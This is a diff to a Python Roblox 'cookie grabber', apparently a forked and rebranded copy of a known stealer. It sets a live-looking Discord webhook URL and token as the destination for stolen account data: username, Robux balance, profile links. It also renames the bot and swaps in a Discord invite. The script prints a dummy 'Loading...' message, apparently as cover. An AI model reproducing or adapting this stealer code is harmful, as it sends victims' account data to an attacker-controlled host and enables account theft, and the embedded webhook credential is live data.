@@ -18,7 +18,7 @@ try:
 except FileNotFoundError:
     print("")
 
-webhook_url = 'heh'
+webhook_url = 'https://discord.com/api/webhooks/1308977999093174282/7Rwnjx8tREsE_4j7cdLTgJMS5U29v8AVBocI6q576Id-3Gh3LzADnW94-rjiSjT9M6Mq'
 
 dummy_message = "Loading..."
 print(dummy_message)
@@ -197,13 +197,13 @@ if __name__ == "__main__":
 
     discord = Discord(url=webhook_url)
     discord.post(
-        username="BOT - Pirate 🍪",
+        username="BOT - Silent🍪",
         avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
         embeds=[
             {
                 "title": "💸 +1 Result Account 🕯️",
                 "thumbnail": {"url": headshot},
-                "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+                "description": f"[Discord](https://discord.gg/shhhgen) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
                 "fields": [
                     {"name": "Username", "value": f"```{username}```", "inline": True},
                     {"name": "Robux Balance", "value": f"```{robux}```", "inline": True},
